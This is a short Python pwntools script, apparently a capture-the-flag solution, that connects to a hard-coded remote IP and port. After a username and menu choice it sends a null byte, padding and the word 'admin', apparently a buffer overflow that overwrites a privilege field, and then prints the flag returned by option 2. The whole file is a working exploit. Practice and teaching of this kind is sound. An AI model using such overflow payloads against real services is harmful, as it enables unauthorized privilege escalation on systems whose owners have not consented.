from pwn import *

host, port = "4.145.98.52", 8001

context.log_level = "CRITICAL"

conn = remote(host, port)

payload = b"\0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCC"

conn.recvuntil(b"Username: ")
conn.sendline(b"Naufal")

conn.recvuntil(b">> ")
conn.sendline(b"1")

conn.recvuntil(b": ")
conn.sendline(payload + b"admin")

conn.recvuntil(b">> ")
conn.sendline(b"2")

flag = conn.recvline().decode().strip()
print(flag)


conn.close()
